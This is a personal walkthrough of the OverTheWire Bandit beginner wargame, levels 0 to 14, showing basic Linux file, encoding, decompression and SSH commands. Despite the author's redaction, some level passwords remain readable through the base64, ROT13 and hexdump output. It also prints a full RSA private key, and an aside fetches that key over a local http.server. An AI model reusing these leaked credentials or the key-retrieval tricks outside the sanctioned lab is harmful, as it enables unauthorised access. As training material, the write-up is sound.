 CTF Journeys , First Stop the Kanto Region ( OverTheWire ... Original ... Bandit Country )
 As Below ... IOT Establish a Solid Foundation , Explore Concepts and Build on Skill Sets
 More of a Personal Notes ... as Opposed to a Walk Through ... My Terminal'ology may Differ

 For Reference I have Used the MarkDown Language for Highlighting / Formatting / Github
 Clear / Blank Lines will be Used For Spacing / Allowing for Easier Reading / Look Back 
 As Generally Follows ... Hashes will be used For Level Headings / Eye Catchers / ALTs

  [ Commands ]    -  will be in Square Brackets
  Clear Text      -  will be in for Goals / Notes
> Terminal Output -  will be in shown > prefixed
 

Flags / DTG Redacted : DC33...R..E..D..A..C..T..E..D... : Side Quests NOT Included ... B26 W/O


>                         _                     _ _ _   
>                        | |__   __ _ _ __   __| (_) |_ 
>                        | '_ \ / _` | '_ \ / _` | | __|
>                        | |_) | (_| | | | | (_| | | |_ 
>                        |_.__/ \__,_|_| |_|\__,_|_|\__|
>                                                       
>
>                      This is an OverTheWire game server. 
>            More information on http://www.overthewire.org/wargames


The Bandit wargame is aimed at absolute beginners. 

It will teach the basics needed to be able to play other wargames. 

If you notice something essential is missing or have ideas for new levels, please let us know!


>   bandit0@bandit.labs.overthewire.org's password: [ bandit0 ]

        ,----..            ,----,          .---.
       /   /   \         ,/   .`|         /. ./|
      /   .     :      ,`   .'  :     .--'.  ' ;
     .   /   ;.  \   ;    ;     /    /__./ \ : |
    .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
    ;   |  ; \ ; | |    :     | /___/ \ |    ' '
    |   :  | ; | ' ;    |.';  ; ;   \  \;      :
    .   |  ' ' ' : `----'  |  |  \   ;  `      |
    '   ;  \; /  |     '   :  ;   .   \    .\  ;
     \   \  ',  /      |   |  '    \   \   ' \ |
      ;   :    /       '   :  |     :   '  |--"
       \   \ .'        ;   |.'       \   \ ;
    www. `---` ver     '---' he       '---" ire.org


>   Welcome to OverTheWire!
>
>   If you find any problems, please report them to the #wargames channel on
>   discord or IRC.
>
   --[ Playing the games ]--
>
>   This machine might hold several wargames.
>   If you are playing "somegame", then:

>   * USERNAMES are somegame0, somegame1, ...
>   * Most LEVELS are stored in /somegame/.
>   * PASSWORDS for each level are stored in /etc/somegame_pass/.

>   Write-access to homedirectories is disabled. It is advised to create a
>   working directory with a hard-to-guess name in /tmp/.  You can use the
>   command "mktemp -d" in order to generate a random and hard to guess
>   directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
>   restricted so that users cannot snoop on eachother. Files and directories
>   with easily guessable or short names will be periodically deleted! The /tmp
>   directory is regularly wiped.
>   Please play nice:

>   * don't leave orphan processes running
>   * don't leave exploit-files laying around
>   * don't annoy other players
>   * don't post passwords or spoilers
>   * again, DONT POST SPOILERS!
>     This includes writeups of your solution on your blog or website!

   --[ Tips ]--

>  This machine has a 64bit processor and many security-features enabled
>  by default, although ASLR has been switched off.  The following
>  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

>  In addition, the execstack tool can be used to flag the stack as
>  executable on ELF binaries.

   Finally, network-access is limited for most levels by a local firewall.

   --[ Tools ]--

>  For your convenience we have installed a few useful tools which you can find
>  in the following locations:

    * gef (https://github.com/hugsy/gef) in /opt/gef/
    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
    * peda (https://github.com/longld/peda.git) in /opt/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)

   --[ More information ]--

>  For more information regarding individual wargames, visit

   http://www.overthewire.org/wargames/

>  For support, questions or comments, contact us on discord or IRC.

   Enjoy your stay!




## Bandit 00

Level Goal :

The password for the next level is stored in a file called readme located in the home directory.

Use this password to log into bandit1 using SSH. Whenever you find a password for a level,

use SSH (on port 2220) to log into that level and continue the game.


[ ls , cat readme ]

ls  - list directory contents

cat - concatenates file and prints on the standard output ( Reads/Prints too Screen )


> DC33...R..E..D..A..C..T..E..D...

DC33...R..E..D..A..C..T..E..D...




## Bandit 01

Level Goal :

The password for the next level is stored in a file called - located in the home directory.


[ ls , cat ./- ]

cat -    - Equates to nothing ... 

cat ./-  - Adds the path to the file


> DC33...R..E..D..A..C..T..E..D...

DC33...R..E..D..A..C..T..E..D...




## Bandit 02

Level Goal : 

The password for the next level is stored in a file called ... 

'spaces in this filename' , located in the home directory.


[ cat "spaces in this filename" ]


> DC33...R..E..D..A..C..T..E..D...

DC33...R..E..D..A..C..T..E..D...




## Bandit 03

Level Goal :

The password for the next level is stored in a hidden file in the inhere directory.


[ cd inhere , ls -la , cat .hidden ]

ls -la  -  use a long listing format , do not ignore entries starting with '.'


> DC33...R..E..D..A..C..T..E..D...

DC33...R..E..D..A..C..T..E..D...




## Bandit 04

Level Goal :

The password for the next level is stored in the only human-readable file in the inhere directory.

Tip : if your terminal is messed up, try the “reset” command


[ cd inhere , ls -la ]

drwxr-xr-x 2 root    root    4096 Oct  5  2023 .
drwxr-xr-x 3 root    root    4096 Oct  5  2023 ..
-rw-r----- 1 bandit5 bandit4   33 Oct  5  2023 -file00
-rw-r----- 1 bandit5 bandit4   33 Oct  5  2023 -file01
-rw-r----- 1 bandit5 bandit4   33 Oct  5  2023 -file02
-rw-r----- 1 bandit5 bandit4   33 Oct  5  2023 -file03
-rw-r----- 1 bandit5 bandit4   33 Oct  5  2023 -file04
-rw-r----- 1 bandit5 bandit4   33 Oct  5  2023 -file05
-rw-r----- 1 bandit5 bandit4   33 Oct  5  2023 -file06
-rw-r----- 1 bandit5 bandit4   33 Oct  5  2023 -file07
-rw-r----- 1 bandit5 bandit4   33 Oct  5  2023 -file08
-rw-r----- 1 bandit5 bandit4   33 Oct  5  2023 -file09

[ file ./* ]

find  -  Search for files in a directory hierarchy
./*   -  Uses the command on all files in the directory , the * Wild Card stands for/used to represent any character

> ./-file00: data
> ./-file01: data
> ./-file02: data
> ./-file03: data
> ./-file04: data
> ./-file05: data
> ./-file06: data
> ./-file07: ASCII text
> ./-file08: data
> ./-file09: data

[ cat ./-file07 ]


> DC33...R..E..D..A..C..T..E..D...

DC33...R..E..D..A..C..T..E..D...




## Bandit 05

Level Goal :

The password for the next level is stored in a file somewhere under the inhere directory and ... 

has all of the following properties

- human-readable
- 1033 bytes in size
- not executable


[ cd inhere , ls -la , find ./ -type f -size 1033c ! -executable ] 

find ( ./ ) through this Dir , ( -type f ) only Files , ( -size ) 1033 (c) bytes , ( ! ) is NOT -executable ...

> ./maybehere07/.file2 ]

[ cat ./maybehere07/.file2 ]


> DC33...R..E..D..A..C..T..E..D...

DC33...R..E..D..A..C..T..E..D...




## Bandit 06

Level Goal :

The password for the next level is stored somewhere on the server and ... 

has all of the following properties

- owned by user bandit7
- owned by group bandit6
- 33 bytes in size


[ find / -type f -user bandit7 -group bandit6 -size 33c 2>/dev/null ]

/           -  Starting from the Root Dir IOT Search the Whole System
-type f     -  Its a File ...
-user       -  Owned by the User bandit7
-group      -  In the Group bandit6
-size       -  Being 33 Bytes
2>/dev/null -  2 is the file Descriptor of stderr , and this Example Redirects it too the / Device / Null 
               ( *Id Est* to Hide Errors , in a Black Hole , and in this case ... Permission denied'zzz )

               
> /var/lib/dpkg/info/bandit7.password ]

[ cat /var/lib/dpkg/info/bandit7.password ]


>  DC33...R..E..D..A..C..T..E..D...

DC33...R..E..D..A..C..T..E..D...




## Bandit 07

Level Goal:

The password for the next level is stored in the file data.txt next to the word millionth


[ ls , data.txt ]

[ grep millionth data.txt ]

grep  -  searches the named input files for ' ' ( By default, grep prints the matching lines )


> millionth       DC33...R..E..D..A..C..T..E..D... 

DC33...R..E..D..A..C..T..E..D...




## Bandit 08

Level Goal :

The password for the next level is stored in the file data.txt and is the only line of text that occurs only once ...


[ ls , cat data.txt ]

... Many Lines of Text ...

[ wc -l data.txt ]

> 1001 data.txt

... 1001 IOT be Precise ...


[ sort data.txt | uniq -c | grep '^ *1 ' ]

sort    - Sort Lines of Text Files

uniq -c - Prefix lines by the number of occurrences

grep    - Searches the named input files for ' ' ( By default, grep prints the matching lines )

'^ *1 ' - That are Unique / Occurs only the Once


>  1   DC33...R..E..D..A..C..T..E..D...  ]

DC33...R..E..D..A..C..T..E..D...



## Bandit 09

Level Goal :

The password for the next level is stored in the file data.txt in one of the few human-readable strings ...

preceded by several ‘=’ characters


[ ls , data.txt ]

[ strings data.txt | grep '^=' ]

strings - Print the Strings of Printable Charachters in File

grep    - Searches the named input files for ' '

'^='    - Preceded ( ^ ) by the Charachter ( = ) 

> =2""L( 
> ========== passwordk^ 
> ========== is 
> =Y!m 
> ========== DC33...R..E..D..A..C..T..E..D... 
> =r=_ 
> =uea 


> ========== DC33...R..E..D..A..C..T..E..D...

DC33...R..E..D..A..C..T..E..D...




## Bandit 10

Level Goal :

The password for the next level is stored in the file data.txt, which contains base64 encoded data ...


[ ls , cat data.txt ]

> VGhlIHBhc3N3b3JkIGlzIDZ6UGV6aUxkUjJSS05kTllGTmI2blZDS3pwaGxYSEJNCg==

[ cat data.txt | base64 -d ]

Cat + Pipe too the base64 Program Which is Standard From/Within the Linux 'coreutils' Package

> The password is DC33...R..E..D..A..C..T..E..D...

[ base64 -d <<< VGhlIHBhc3N3b3JkIGlzIDZ6UGV6aUxkUjJSS05kTllGTmI2blZDS3pwaGxYSEJNCg== ]

Instead of using *Concatenate* base64 can Pull ( <<< ) From a String ...

> The password is DC33...R..E..D..A..C..T..E..D...


## --------------------------------- ALT ---------------------------------


[ python3 -m base64 -d <<< VGhlIHBhc3N3b3JkIGlzIDZ6UGV6aUxkUjJSS05kTllGTmI2blZDS3pwaGxYSEJNCg== ]

Same Detail with Python3 using the Module base64 and the Option -d ... 

> The password is DC33...R..E..D..A..C..T..E..D...

... Option -e IOT Encode ( dont forget the " ... " )

[ python3 -m base64 -e <<< "The password is DC33...R..E..D..A..C..T..E..D..." ]

> VGhlIHBhc3N3b3JkIGlzIDZ6UGV6aUxkUjJSS05kTllGTmI2blZDS3pwaGxYSEJNCg==


DC33...R..E..D..A..C..T..E..D...




## Bandit 11

Level Goal :

The password for the next level is stored in the file data.txt ...

where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions


[ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m' ]

tr  -  Stands for ’translate’ , which Allows replacing characters with others ... 

The BaseLine Command Syntax looks like the Following : tr 'Old_Chars' 'New_Chars'

'N-ZA-Mn-za-m' uses the ROT13 transformation of both upper and lowercase letters


... ROT13 Obfuscation be Like : ... A Becomes N AND Z Becomes M ... 

... ABCDEFGHIJKLM NOPQRSTUVWXYZ ... abcdefghijklm nopqrstuvwxyz ...    
... NOPQRSTUVWXYZ ABCDEFGHIJKLM ... nopqrstuvwxyz abcdefghijklm ...

... E/O >>> https://en.wikipedia.org/wiki/ROT13 for More Detail ...


> The password is DC33...R..E..D..A..C..T..E..D... ] 

DC33...R..E..D..A..C..T..E..D...


## --------------------------------- ALT ---------------------------------


[ ls , cat data.txt ]

> Gur cnffjbeq vf WIAOOSFzMjXXBC0KoSKBbJ8puQm5lIEi

[ bandit11@bandit:~$ python3 ]

Python 3.10.12 (main, Jun 11 2023, 05:26:28) [GCC 11.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import codecs
>>> codecs.decode('Gur cnffjbeq vf WIAOOSFzMjXXBC0KoSKBbJ8puQm5lIEi','rot13')
'The password is JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv'
>>>

DC33...R..E..D..A..C..T..E..D...




## Bandit 12

Level Goal :

The password for the next level is stored in the file data.txt ... 

Which is a hexdump of a file that has been repeatedly compressed.

For this level it may be useful to create a directory under /tmp in which you can work.

Use mkdir with a hard to guess directory name. Or better, use the command “mktemp -d”. 

Then copy the datafile using cp, and rename it using mv (read the manpages!)


[ ls , head data.txt ]

Head - Output the First Ten Lines of a File ... Opposite is >>> Tail

> 00000000: 1f8b 0808 6855 1e65 0203 6461 7461 322e  ....hU.e..data2. 
> 00000010: 6269 6e00 013d 02c2 fd42 5a68 3931 4159  bin..=...BZh91AY 
> 00000020: 2653 5948 1b32 0200 0019 ffff faee cff7  &SYH.2.......... 
> 00000030: f6ff e4f7 bfbc ffff bff7 ffb9 39ff 7ffb  ............9... 
> 00000040: bd31 eeff b9fb fbbb b9bf f77f b001 3b2c  .1............;, 
> 00000050: d100 0d03 d200 6868 0d00 0069 a00d 0340  ......hh...i...@ 
> 00000060: 1a68 00d0 0d01 a1a0 0001 a680 0003 46d4  .h............F. 
> 00000070: 6434 3234 611a 340d 07a4 c351 068f 5000  d424a.4....Q..P. 
> 00000080: 069a 0680 0000 0006 8006 8da4 681a 6868  ............h.hh 
> 00000090: 0d06 8d00 6834 3400 d07a 9a00 01a0 0341  ....h44..z.....A 

Hexdumps are Often Used to Look at Data that Can NOT be Represented in Strings ...
Therefore they are NOT Readable , Soooo ... it is EASIER to Look at the HEX Values  

A Hexdump has Three Main Columns :

First  - shows the Address , 
Second - shows the Hex Representation of the Data on that Address
Last   - shows the Actual Data as Strings ( with ‘.’ being Hex Values that CANT be Repped as a string )

Hexdumps can be used to Figure out the Type of a File. 
Each file type has a Magic Number / File Signature ...

For Gzip Compressed Files the Header is \x1F\x8B\x08 aka 1f8b 08
For Bzip Compressed Files the Header is \x42\x5A\x68 aka 425a 68
For Tar  Compressed Files the Header is \x64\x61\x74 aka 6461 74

E/O Sigs : https://en.wikipedia.org/wiki/List_of_file_signatures

[ mktemp -d ]

mktemp - Command IOT Create a TEMPOrary File or Directory
-d     - Option Dictates ... Directory

> /tmp/tmp.Ay7VrX8ogQ

[ cd /tmp/tmp.Ay7VrX8ogQ ]

[ cp ~/data.txt . ]

cp  -  Command too ... Copy Files AND Directories
~/  -  AKA  Tilde , ( ~ ) indicates the Home Directory of the User

[ ls ] 

data.txt

[ xxd -r data.txt data ]

xxd  - Creates Hexdumps > 'Input_File' 'Output_File' ( When using -r , it Reverses the Hexdump )

[ ls , cat data | head ]


 P�^data2.bin=��BZh91AY&SY�O����ڞOv���}?��}��^����������ߣ��;����▒4��▒h�F�F��4▒LM
                                                                               @��z��FM��C�hF�C@�4@f��h
4hh�▒=C%�>X▒,�k���1��GY��                                                                              ��i�hPh�Mh
�J�쌑Oϊ��{RBp�Qix�Y�Z!d��j�(�搿ݳ��/��A�#�A��F��0P��v��`�"3�

                                          ��d�bX?��z��2��<��A �n}
5(3A��
      wO�R����6�XS{�
���9?L�P�yB��=z�m?�L�Nt*�7{qP���%"�w9�qm4�� N3�6���K��H䋑[��}!
                                                               d��3A4$��M~�\ɠJ�C�kUƦ\���\�FSN��&=�[��q   \)�$:��H�t&/�(����]��BB9<s ��h

                                                              
[ clear , file data ]

clear  -  IOT Clear the Terminal Screen ... NOT the ' reset ' Command ( Which is for ... Terminal Initialization )

> data: gzip compressed data, was "data2.bin", last modified:
> Thu Oct  5 06:19:20 2023, 
> max compression, from Unix, original size modulo 2^32 573 ]

[ mv data data2.gz , ls ]

mv  -  Move ( Rename ) Files ... IOT - Rename and Change the Suffix of Data bk to .gz

[ xxd data2.gz | head ]

> 00000000: 1f8b 0808 6855 1e65 0203 6461 7461 342e  ....hU.e..data4.
> 00000010: 6269 6e00 edd1 cf4b 1461 1cc7 f187 711d  bin....K.a....q.
> 00000020: 4410 5c08 7415 65bb b8d0 41e6 1967 d6dd  D.\.t.e...A..g..
> 00000030: dbee 8298 45b4 9009 5b22 8cec 4153 5c5a  ....E...["..AS\Z
> 00000040: 574f 91e3 2a9a 4ab0 4607 490c a30d fc0b  WO..*.J.F.I.....
> 00000050: 4210 b42e 2196 0759 130f a292 dd3c 8881  B...!..Y.....<..
> 00000060: 9897 6aca 9b81 9df2 07bc 5f97 cf97 e779  ..j......._....y
> 00000070: 2edf e713 b752 9659 ddda de25 fe1f cde1  .....R.Y...%....
> 00000080: 378c 3fe9 3891 baf1 7b96 86a9 d51a a66e  7.?.8...{......n
> 00000090: 9ace b994 ba51 2bbc 9a38 033d dd29 2be9  .....Q+..8.=.)+.

[ gzip -d data2.gz , ls , file data2 ]

gzip -d  -  IOT Decompress

> data2: bzip2 compressed data, block size = 900k 

[ xxd data2 | head ]

> 00000000: 425a 6839 3141 5926 5359 481b 3202 0000  BZh91AY&SYH.2...
> 00000010: 19ff fffa eecf f7f6 ffe4 f7bf bcff ffbf  ................
> 00000020: f7ff b939 ff7f fbbd 31ee ffb9 fbfb bbb9  ...9....1.......
> 00000030: bff7 7fb0 013b 2cd1 000d 03d2 0068 680d  .....;,......hh.
> 00000040: 0000 69a0 0d03 401a 6800 d00d 01a1 a000  ..i...@.h.......
> 00000050: 01a6 8000 0346 d464 3432 3461 1a34 0d07  .....F.d424a.4..
> 00000060: a4c3 5106 8f50 0006 9a06 8000 0000 0680  ..Q..P..........
> 00000070: 068d a468 1a68 680d 068d 0068 3434 00d0  ...h.hh....h44..
> 00000080: 7a9a 0001 a003 41ea 1ea1 90da 403d 10ca  z.....A.....@=..
> 00000090: 6834 6868 0000 c81a 1a1b 5006 83d4 34d0  h4hh......P...4.

[ mv data2 data2.bz ]

IOT - Rename and Change the suffix too .bz

[ bzip2 -d data2.bz ]

bzip2 -d  -  IOT Decompress 

[ ls , file data2 ]

> data2: gzip compressed data, was "data4.bin", 
> last modified: Thu Oct  5 06:19:20 2023, max compression, 
> from Unix, original size modulo 2^32 20480 ]

... Rinse and Repeat ...

[ mv data2 data2.gz , gzip -d data2.gz , file data2 ]

> data2: POSIX tar archive (GNU) 

[ xxd data2 | head ]

> 00000000: 6461 7461 352e 6269 6e00 0000 0000 0000  data5.bin....... 
> 00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 
> 00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 
> 00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 
> 00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 
> 00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 
> 00000060: 0000 0000 3030 3030 3634 3400 3030 3030  ....0000644.0000 
> 00000070: 3030 3000 3030 3030 3030 3000 3030 3030  000.0000000.0000 
> 00000080: 3030 3234 3030 3000 3134 3530 3734 3532  0024000.14507452 
> 00000090: 3535 3000 3031 3132 3437 0020 3000 0000  550.011247. 0... 

[ mv data2 data5.tar ]

[ xxd data5.tar | head ]

... c o n f i r m a t i o n  d r i l l s ...

[ tar -xf data5.tar ]

tar -xf ( --extract --file )  -  IOT Decompress ( Reversed is -cf )

[ ls , file data5.bin ]

> data5.bin: POSIX tar archive (GNU) ]

[ xxd data5.bin ]

> 00000000: 6461 7461 362e 6269 6e00 0000 0000 0000  data6.bin.......
> 00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
> 00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
> 00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
> 00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
> 00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
> 00000060: 0000 0000 3030 3030 3634 3400 3030 3030  ....0000644.0000
> 00000070: 3030 3000 3030 3030 3030 3000 3030 3030  000.0000000.0000
> 00000080: 3030 3030 3333 3100 3134 3530 3734 3532  0000331.14507452
> 00000090: 3535 3000 3031 3132 3531 0020 3000 0000  550.011251. 0...

[ tar -xf data5.bin , ls ]

> data5.bin  data5.tar  data6.bin  data.txt

[ xxd data6.bin | head ]

> 00000000: 425a 6839 3141 5926 5359 0403 8894 0000  BZh91AY&SY......
> 00000010: 8bff dfdc 5c80 41c0 6ff7 e000 f1a3 8076  ....\.A.o......v
> 00000020: 61fe 0000 0800 1002 0000 7282 0400 8442  a.........r....B
> 00000030: 0820 0092 0d4a 1906 21a0 3118 8191 90d3  . ...J..!.1.....
> 00000040: 269a 0632 6936 a0d1 49f9 501a 3206 83d4  &..2i6..I.P.2...
> 00000050: d340 0686 4000 3406 f8de 6bf1 0202 ca80  .@..@.4...k.....
> 00000060: 4082 9b19 384d 7cd4 5631 40c8 101e e350  @...8M|.V1@....P
> 00000070: 87cd dcd3 325b 6a19 1be4 902e a476 1127  ....2[j......v.'
> 00000080: 8931 8d1a 73b8 e31e 00b6 5402 5449 82f2  .1..s.....T.TI..
> 00000090: 9856 e089 2aa8 41d8 5e4f 0a9e 0539 f5d5  .V..*.A.^O...9..

[ file data6.bin ]

> data6.bin: bzip2 compressed data, block size = 900k

[ bzip2 -d data6.bin ]

> bzip2: Can't guess original name for data6.bin -- using data6.bin.out

[ file data6.bin.out ]

> data6.bin.out: POSIX tar archive (GNU)

[ xxd data6.bin.out | head ]

> 00000000: 6461 7461 382e 6269 6e00 0000 0000 0000  data8.bin.......
> 00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
> 00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
> 00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
> 00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
> 00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
> 00000060: 0000 0000 3030 3030 3634 3400 3030 3030  ....0000644.0000
> 00000070: 3030 3000 3030 3030 3030 3000 3030 3030  000.0000000.0000
> 00000080: 3030 3030 3131 3700 3134 3530 3734 3532  0000117.14507452
> 00000090: 3535 3000 3031 3132 3535 0020 3000 0000  550.011255. 0...

[ mv data6.bin.out data6.tar , tar -xf data6.bin.out , ls ]

> data5.bin  data5.tar  data6.tar  data8.bin  data.txt

[ file data8.bin ]

> data8.bin: gzip compressed data, was "data9.bin", last modified:
> Thu Oct  5 06:19:20 2023, max compression,
> from Unix, original size modulo 2^32 49

[ xxd data8.bin | head ]

> 00000000: 1f8b 0808 6855 1e65 0203 6461 7461 392e  ....hU.e..data9.
> 00000010: 6269 6e00 0bc9 4855 2848 2c2e 2ecf 2f4a  bin...HU(H,.../J
> 00000020: 51c8 2c56 284f 0a4f c971 aa70 cd2c 3271  Q.,V(O.O.q.p.,2q
> 00000030: 4e74 b5f0 490c c848 2c2d f5cf 372b 280f  Nt..I..H,-..7+(.
> 00000040: ca2d 7229 e702 00dc ec75 4731 0000 00    .-r).....uG1...

[ mv data8.bin data8.gz ]

[ gzip -d data8.gz , ls ]

> data5.bin  data5.tar  data6.tar  data8  data.txt

[ file data8 ]

> data8: ASCII text

[ xxd data8 | head ]

> 00000000: 5468 6520 7061 7373 776f 7264 2069 7320  The password is 
> 00000010: 7762 5764 6c42 7845 6972 3443 6145 384c  wbWdlBxEir4CaE8L
> 00000020: 6150 6861 7575 4f6f 3670 7752 6d72 4477  aPhauuOo6pwRmrDw
> 00000030: 0a                                       

[ cat data8 ]

> The password is DC33...R..E..D..A..C..T..E..D...

DC33...R..E..D..A..C..T..E..D...




## Bandit 13 

Level Goal : 

The password for the next level is stored in /etc/bandit_pass/bandit14 and ...

can only be read by user bandit14. 

For this level, you don’t get the next password, but ...

you can get a private SSH key that can be used to log into the next level. 

Note: localhost is a hostname that refers to the machine you are working on.


[ ls , cat sshkey.private ]


 -----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+
gg0tcr7Fw8NLGa5+Uzec2rEg0WmeevB13AIoYp0MZyETq46t+jk9puNwZwIt9XgB
ZufGtZEwWbFWw/vVLNwOXBe4UWStGRWzgPpEeSv5Tb1VjLZIBdGphTIK22Amz6Zb
ThMsiMnyJafEwJ/T8PQO3myS91vUHEuoOMAzoUID4kN0MEZ3+XahyK0HJVq68KsV
ObefXG1vvA3GAJ29kxJaqvRfgYnqZryWN7w3CHjNU4c/2Jkp+n8L0SnxaNA+WYA7
jiPyTF0is8uzMlYQ4l1Lzh/8/MpvhCQF8r22dwIDAQABAoIBAQC6dWBjhyEOzjeA
J3j/RWmap9M5zfJ/wb2bfidNpwbB8rsJ4sZIDZQ7XuIh4LfygoAQSS+bBw3RXvzE
pvJt3SmU8hIDuLsCjL1VnBY5pY7Bju8g8aR/3FyjyNAqx/TLfzlLYfOu7i9Jet67
xAh0tONG/u8FB5I3LAI2Vp6OviwvdWeC4nOxCthldpuPKNLA8rmMMVRTKQ+7T2VS
nXmwYckKUcUgzoVSpiNZaS0zUDypdpy2+tRH3MQa5kqN1YKjvF8RC47woOYCktsD
o3FFpGNFec9Taa3Msy+DfQQhHKZFKIL3bJDONtmrVvtYK40/yeU4aZ/HA2DQzwhe
ol1AfiEhAoGBAOnVjosBkm7sblK+n4IEwPxs8sOmhPnTDUy5WGrpSCrXOmsVIBUf
laL3ZGLx3xCIwtCnEucB9DvN2HZkupc/h6hTKUYLqXuyLD8njTrbRhLgbC9QrKrS
M1F2fSTxVqPtZDlDMwjNR04xHA/fKh8bXXyTMqOHNJTHHNhbh3McdURjAoGBANkU
1hqfnw7+aXncJ9bjysr1ZWbqOE5Nd8AFgfwaKuGTTVX2NsUQnCMWdOp+wFak40JH
PKWkJNdBG+ex0H9JNQsTK3X5PBMAS8AfX0GrKeuwKWA6erytVTqjOfLYcdp5+z9s
8DtVCxDuVsM+i4X8UqIGOlvGbtKEVokHPFXP1q/dAoGAcHg5YX7WEehCgCYTzpO+
xysX8ScM2qS6xuZ3MqUWAxUWkh7NGZvhe0sGy9iOdANzwKw7mUUFViaCMR/t54W1
GC83sOs3D7n5Mj8x3NdO8xFit7dT9a245TvaoYQ7KgmqpSg/ScKCw4c3eiLava+J
3btnJeSIU+8ZXq9XjPRpKwUCgYA7z6LiOQKxNeXH3qHXcnHok855maUj5fJNpPbY
iDkyZ8ySF8GlcFsky8Yw6fWCqfG3zDrohJ5l9JmEsBh7SadkwsZhvecQcS9t4vby
9/8X4jS0P8ibfcKS4nBP+dT81kkkg5Z5MohXBORA7VWx+ACohcDEkprsQ+w32xeD
qT1EvQKBgQDKm8ws2ByvSUVs9GjTilCajFqLJ0eVYzRPaY6f++Gv/UVfAPV4c+S0
kAWpXbv5tbkkzbS0eaLPTKgLzavXtQoTtKwrjpolHKIHUz6Wu+n4abfAIRFubOdN
/+aLoRQ0yBDRbdXMsZN/jvY44eM+xRLdRVyMmdPtP8belRi2E2aEzA==
-----END RSA PRIVATE KEY-----


[ DC@Redacted:~$ scp -P 2220 bandit13@bandit.labs.overthewire.org:sshkey.private . ]


scp  -  is a Command that Uses SSH to TRANSFER Data OVER the Network . 

The Syntax to Get a File FROM a Remote Host looks like the Following : 

scp -P <port> <user>@<IP>:<remotefilepath> <localfilepath>. 

To SEND a File to a Remote Host, the LOCAL File Path NEEDS to Stand at the Beginning .


>                         _                     _ _ _   
>                        | |__   __ _ _ __   __| (_) |_ 
>                        | '_ \ / _` | '_ \ / _` | | __|
>                        | |_) | (_| | | | | (_| | | |_ 
>                        |_.__/ \__,_|_| |_|\__,_|_|\__|
>                                                       
>
>                      This is an OverTheWire game server. 
>            More information on http://www.overthewire.org/wargames
>
> bandit13@bandit.labs.overthewire.org's password:
>
> sshkey.private                                       100% 1679    30.5KB/s   00:00


[ DC33@Redacted:~$ ssh -i sshkey.private bandit14@bandit.labs.overthewire.org -p 2220 ]


>                         _                     _ _ _   
>                        | |__   __ _ _ __   __| (_) |_ 
>                        | '_ \ / _` | '_ \ / _` | | __|
>                        | |_) | (_| | | | | (_| | | |_ 
>                        |_.__/ \__,_|_| |_|\__,_|_|\__|
>                                                       
>
>                      This is an OverTheWire game server. 
>           More information on http://www.overthewire.org/wargames
>
> @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
> @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
> @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
> Permissions 0640 for 'sshkey.private' are too open.
> It is required that your private key files are NOT accessible by others.
> This private key will be ignored.
> Load key "sshkey.private": bad permissions
> bandit14@bandit.labs.overthewire.org's password:


[ ctrl + c , ls -la sshkey.private ]

... c o n f i r m a t i o n  d r i l l s  ...

> -rw-r----- 1 DC33 DC33 1679 May 33 33:33 sshkey.private


[ chmod 700 sshkey.private ]

chmod - Change File Mode Bits ( permissions )
700   - Means YOU CAN DO Anything with the File ...  
        OTHER USERS have NO Access to IT at ALL ... 

More Detail chmod - https://www.multacom.com/faq/password_protection/file_permissions.htm

[ ls -la sshkey.private ]

... c o n f i r m a t i o n  d r i l l s  ...

> -rwx------ 1 DC33 DC33 1679 May 33 33:33 sshkey.private

[ ssh -i sshkey.private bandit14@bandit.labs.overthewire.org -p 2220 ]


>                         _                     _ _ _   
>                        | |__   __ _ _ __   __| (_) |_ 
>                        | '_ \ / _` | '_ \ / _` | | __|
>                        | |_) | (_| | | | | (_| | | |_ 
>                        |_.__/ \__,_|_| |_|\__,_|_|\__|
>                                                       
>
>                      This is an OverTheWire game server. 
>            More information on http://www.overthewire.org/wargames
>
> --[ More information ]--
>
>  For more information regarding individual wargames, visit
>  http://www.overthewire.org/wargames/
>
>  For support, questions or comments, contact us on discord or IRC.
>
>  Enjoy your stay!



## -------------------------------------------------------------------------------- 

   Similar Objective / GoodToKnow , Same Network , nN SSH ( no SCP ) , Python Alt :

 [ python3 -m http.server 1337 ] ... [ wget 127.0.0.1/home/bandit13/sshkey.private ]

## -------------------------------------------------------------------------------- 




## bandit 14

Level Goal :

The password for the next level can be retrieved by ... 

submitting the password of the current level to port 30000 on localhost.


[ ssh -i sshkey.private bandit14@bandit.labs.overthewire.org -p 2220 ]

[ bandit14@bandit:~$ cat /etc/bandit_pass/bandit14 ]

> DC33...R..E..D..A..C..T..E..D...


Localhost is a hostname that refers to the local machine currently making the request . 
On many computers , localhost is an alias for the IP address 127.0.0.1  ...
